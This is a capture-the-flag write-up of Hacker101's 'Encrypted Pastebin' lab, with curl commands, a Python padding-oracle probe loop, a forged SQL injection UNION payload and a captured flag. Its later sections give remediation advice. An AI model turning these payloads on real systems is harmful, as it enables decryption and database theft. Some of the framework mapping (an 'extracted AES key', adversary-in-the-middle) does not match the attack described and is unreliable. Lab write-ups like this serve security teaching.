# Encrypted Pastebin: Complete Writeup (4/4)

**Difficulty:** Hard  
**Category:** Web, Cryptography  
**Platform:** Hacker101 CTF  
**Status:** 4/4 flags captured

A web paste application where each paste's title and body are stored as JSON encrypted with AES-CBC. The shareable link contains the ciphertext encoded in a custom base64 variant (substitutions: `~=`, `!/`, `-+`). Backend uses MySQL with `posts` and `tracking` tables. The hardest flag requires a padding oracle attack to forge a ciphertext that triggers SQL injection.

---

## Prerequisites

- Hacker101 VPN active
- Python 3 with `requests`
- ~50 minutes for the padding oracle attack (oracle via HTTP responses)

---

## FLAG 0: HTML Source Exposure

**Technique:** Inspect the index page source

FLAG 0 appears directly in the HTML of the index page.

```bash
curl https://HASH.ctf.hacker101.com/ | grep -o '\^FLAG\^[a-f0-9]*\$FLAG\$'
```

**Result:** Flag visible in the index HTML source.

---

## FLAG 1: Paste Creation

**Technique:** POST request to create a paste

Submitting the paste creation form with any content causes the flag to appear in the redirect response.

```bash
curl -s -D - -X POST https://HASH.ctf.hacker101.com/ \
  -d "title=test&body=test"
```

The flag appears in the `Location` header or response body. The returned token is the AES-CBC ciphertext in custom base64.

---

## FLAG 2: Malformed Base64 Token

**Technique:** Invalid token → traceback with flag

Sending a token with invalid base64 (length not a multiple of 4) raises an exception other than `PaddingException`, which exposes the flag via a full Python traceback.

```bash
curl "https://HASH.ctf.hacker101.com/?post=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
```

**Behavior:** `PaddingException` → only shows "PaddingException" (no flag). Any other exception → FLAG + full traceback.

---

## FLAG 3: Padding Oracle Attack + SQL Injection

**Technique:** Padding oracle to forge ciphertext → SQL injection → internal URL → FLAG

### Overview

The server uses AES-CBC without integrity authentication (no MAC). This enables a padding oracle attack:

1. Send a manipulated ciphertext to the server
2. Check via the response whether PKCS7 padding was valid
3. Recover the intermediate bytes for each ciphertext block
4. Forge a new ciphertext that decrypts to an arbitrary payload (SQL injection query)

### Ciphertext structure

```
Token: base64_custom(IV[16] || CT1[16] || CT2[16] || ... || CT9[16])
Total: 10 blocks of 16 bytes = 160 bytes
```

**Custom encode/decode:**
```python
def cdec(x):
    if isinstance(x, str): x = x.encode()
    return b64decode(x.replace(b'~', b'=').replace(b'!', b'/').replace(b'-', b'+'))

def cenc(x):
    return b64encode(x).replace(b'=', b'~').replace(b'/', b'!').replace(b'+', b'-').decode()
```

### Padding oracle

The oracle works as follows:
- **True** (valid padding): server returns a response WITHOUT "padding" in the text
- **False** (invalid padding): server returns "PaddingException"

**CRITICAL:** Use the **last ciphertext block** (`blocks[-1]`) as `dummy_ct`. Confirm oracle behavior by scanning all 256 values for byte 15:

```python
for g in range(256):
    iv = b'\x00'*15 + bytes([g])
    url = f"{EP_URL}/?post={cenc(iv + blocks[-1])}"
    r = requests.get(url)
    if 'padding' not in r.text.lower():
        print(f"VALID: g={g}, intermediate[15] = {g ^ 0x01}")
        break
```

**Expected result:** exactly 1 value of `g` in 0–255 returns True.

### SQL injection payload

Extract URLs from the `tracking.headers` table (where an internal bot stores HTTP headers of accesses):

```python
payload = b'{"id":"0 UNION SELECT group_concat(headers),1 FROM tracking"}'
# Padded to 64 bytes (4 PKCS7 blocks with \x03\x03\x03)
```

### Exploit script

See `scripts/padding_oracle_flag4.py`.

```bash
python3 scripts/padding_oracle_flag4.py
```

**Estimated time:** ~45–55 minutes (9,649 requests, 8 threads, ~3.3 req/s)

### Result

The response to the forged token contains the `headers` stored by the internal bot in the `tracking` table:

```
Referer: http://127.0.0.1:PORT/?post=INTERNAL_TOKEN
User-Agent: Mozilla/5.0 (Windows NT 10.0...) Chrome/67.0.3396.99
...
```

### Accessing the internal post

Using the token extracted from the headers, access it via the public URL:

```bash
curl "https://HASH.ctf.hacker101.com/?post=INTERNAL_TOKEN"
```

The internal post contains FLAG 3 in the `<pre>` element:

```html
<pre>^FLAG^1f5d183d59a9e3278e412388c56a25447ef0f4a5d7a625316ac29e89b5fd1444$FLAG$</pre>
```

---

## Flags Summary

| Index | Method |
|-------|--------|
| 0 | Exposed in index page HTML source |
| 1 | POST paste creation response |
| 2 | Malformed base64 token → Python traceback |
| 3 | Padding oracle + SQL injection + internal URL access |

---

## Technical Explanation

**Root cause:** AES-CBC without integrity authentication (no HMAC or GCM).

In AES-CBC, decryption of block `CTi` depends only on the key and the previous block `CT(i-1)` (acting as IV):

```
P[i] = AES_Decrypt(CT[i]) XOR CT[i-1]
```

The server verifies PKCS7 padding before processing the JSON. When a manipulated ciphertext has valid padding but invalid JSON, the server raises a different exception (not `PaddingException`), revealing the oracle behavior to the attacker.

This allows:
1. **Recovering the intermediate value** `D(CT)` for any ciphertext block
2. **Forging an arbitrary IV**: `IV_forged = D(CT) XOR desired_plaintext`
3. Repeating for each block of the payload until the full forged ciphertext is complete

---

## Lessons Learned

1. AES-CBC requires integrity authentication: use AES-GCM or add HMAC-SHA256
2. Error messages must not differentiate between types of decryption exceptions
3. The internal bot creates an attack vector: the `tracking` table stores headers with access tokens via the Referer header
4. SQL injection in `id` field via `UNION SELECT` with `group_concat` extracts data across tables

---

## MITRE ATT&CK Mapping

| ID | Technique | Tactic | How it was used |
|----|-----------|--------|----------------|
| T1190 | Exploit Public-Facing Application | Initial Access | Padding oracle attack on encrypted paste parameter |
| T1059.006 | Command and Scripting Interpreter: Python | Execution | Python scripts for automated padding oracle decryption |
| T1005 | Data from Local System | Collection | Extracted AES key, IV and admin notes via decryption |
| T1557 | Adversary-in-the-Middle | Credential Access | Manipulated ciphertext blocks to inject SQL via CBC bitflip |
| T1552.004 | Unsecured Credentials: Private Keys | Credential Access | AES key derived from readable encrypted parameter |

## Remediation and Containment

### Technical Fixes

1. Migrate to AES-GCM (built-in authentication) or add HMAC-SHA256 before CBC encryption
2. Use a generic response for any decryption error ("Invalid token")
3. Parameterize SQL queries (use `?` with `cursor.execute`, never string interpolation)
4. Sanitize the `id` field to accept integers only

### OWASP Top 10 2021

| ID | Category | Relevance |
|----|----------|-----------|
| A02:2021 | Cryptographic Failures | AES-CBC without authentication; padding oracle leaks plaintext |
| A03:2021 | Injection | SQL injection via CBC bitflip allows arbitrary queries |
| A05:2021 | Security Misconfiguration | Verbose error messages distinguish padding from application errors |

### MITRE D3FEND Countermeasures

| ID | Technique | Application |
|----|-----------|-------------|
| D3-ANET | Authenticated Encryption | Replace AES-CBC with AES-GCM to prevent padding oracle |
| D3-SPP | Strong Password Policy | Rotate encryption keys regularly; use proper KDF (HKDF, PBKDF2) |
| D3-MFA | Multi-factor Authentication | Limit access to paste creation/editing endpoints |

### NIST CSF 2.0

| Function | Category | Application |
|----------|----------|-------------|
| PR (Protect) | PR.DS | Encrypt data at rest with authenticated encryption (AEAD) |
| PR (Protect) | PR.AC | Access control on paste management; input validation |
| DE (Detect) | DE.CM | Monitor for repeated malformed requests (padding oracle probes) |
| RS (Respond) | RS.AN | Analyze padding oracle attack patterns in WAF/IDS logs |

### NIST SP 800-53 Rev. 5

| Control | Title | Application |
|---------|-------|-------------|
| SC-12 | Cryptographic Key Establishment and Management | Proper key derivation, rotation, and storage for AES keys |
| SC-13 | Cryptographic Protection | Use AEAD (AES-GCM/ChaCha20-Poly1305); never raw CBC |
| SI-10 | Information Input Validation | Validate and sanitize all user input before SQL queries |
| SI-11 | Error Handling | Return generic errors; never distinguish cryptographic failures |

### C2M2

| Domain | Practice | MIL | Application |
|--------|----------|-----|-------------|
| ACCESS | Access Control Management | MIL-2 | Enforce least privilege on paste endpoints; authenticate all operations |
| ASSET | Asset, Change, and Configuration Management | MIL-2 | Track cryptographic configurations; enforce AEAD across all encryption |

---

## Final Thoughts

Thanks guys!! (❍ᴥ❍ʋ)

---

Padding oracle attacks are a masterclass in how error messages become oracles: a single bit of information (valid vs. invalid padding) is enough to decrypt entire ciphertext blocks. Combine that with CBC bitflip for SQL injection, and you have a full chain from crypto to database compromise. Always use authenticated encryption.

Follow me for more CTF content:

- Instagram: https://www.instagram.com/uniaogeek
- LinkedIn: http://linkedin.com/in/mrhenrike
- X: https://x.com/mrhenrike
